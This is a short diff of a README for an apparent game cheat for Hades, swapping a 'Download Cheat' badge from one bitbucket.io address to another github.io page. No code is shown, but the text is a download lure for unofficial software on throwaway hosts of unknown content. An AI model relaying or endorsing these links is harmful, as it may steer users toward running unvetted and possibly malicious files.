@@ -4,7 +4,7 @@
 
 Whether you're speedrunning or just want to flex with full builds instantly, this is how you take control of the underworld — permanently.
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://fileoffload13.bitbucket.io)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://Hades-Cheat-tar.github.io/.github)
 ---
 
 ## 🎮 What Is a Hades Cheat?
